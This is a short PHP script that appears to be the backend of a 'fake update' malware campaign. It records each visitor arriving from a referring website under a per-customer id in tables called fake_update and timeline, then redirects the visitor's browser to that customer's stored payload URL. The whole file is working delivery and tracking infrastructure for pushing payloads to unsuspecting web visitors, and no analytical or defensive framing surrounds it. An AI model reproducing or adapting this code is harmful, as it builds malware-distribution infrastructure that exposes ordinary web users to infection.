<?php
require_once ('../includes/functions.php');



$jsTimestamp = substr($_GET["t"], 0, -3);

$refererUrl = $_SERVER['HTTP_REFERER'];

$clientUniq = $_GET["uid"];


$uniq = md5($clientUniq . $jsTimestamp . $refererUrl);
$timelineUniq = md5($clientUniq . $jsTimestamp . $refererUrl."fake");

$db->bind("unique_id", $uniq);

$dataCheck = $db->query("SELECT * FROM fake_update WHERE unique_id = :unique_id ");

if (empty($dataCheck)) {
    
    $db->bindMore(array(
        "client_id" => $clientUniq,
        "unique_id" => $uniq,
        "website" => $refererUrl,
        "remove" => "no"
    ));
    
    $db->query("INSERT INTO fake_update (`client_id`,  `unique_id`, `website`, `remove`,  `time` ) 
            VALUES (:client_id, :unique_id, :website, :remove, NOW() )");


    $db->bindMore(array(
        "client_id" => $clientUniq,
        "unique_id" => $timelineUniq,
        "page_load" => $jsTimestamp,
        "website" => $refererUrl,
        "type" => "fake_update"
    ));

    $db->query("INSERT INTO timeline ( `client_id`, `unique_id`,  `page_load`, `website`, `type`, `time`) 
            VALUES (:client_id, :unique_id, :page_load, :website, :type, NOW() )");

}

$db->bind("client_id", $clientUniq);
$payload = $db->single("SELECT payload_url FROM clients WHERE client_id = :client_id ");

header("Location: $payload");

?>